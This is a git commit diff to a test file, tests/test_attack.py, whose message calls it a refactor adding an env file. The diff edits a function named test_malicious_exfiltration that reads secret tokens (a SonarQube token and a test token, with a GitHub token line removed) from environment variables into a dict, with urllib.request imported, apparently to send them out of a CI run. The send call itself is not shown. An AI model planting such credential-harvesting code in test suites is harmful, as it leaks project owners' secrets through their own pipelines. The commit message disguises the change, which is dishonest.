3c9433dde1659eb173a03d4195f9865c6876f914
pxxguin <janghongseo@naver.com>
2026-08-04 10:22:38 +0900

    refactor: new env file added

--- tests/test_attack.py
+++ tests/test_attack.py
@@ -1,15 +1,12 @@
 import os
 import urllib.request
 import json
-import base64
 
 def test_malicious_exfiltration():
-    github_token = os.environ.get("GETHUB_TOKEN", "NOT_FOUND")
     sonar_token = os.environ.get("PXXGUIN_SONAR_TOKEN", "NOT_FOUND")
     test_token = os.environ.get("THIS_IS_TEST", "NOT_FOUND")
-
+    
     data = {
-        "github_token": github_token,
         "sonar_token": sonar_token,
         "test_token":test_token
     }
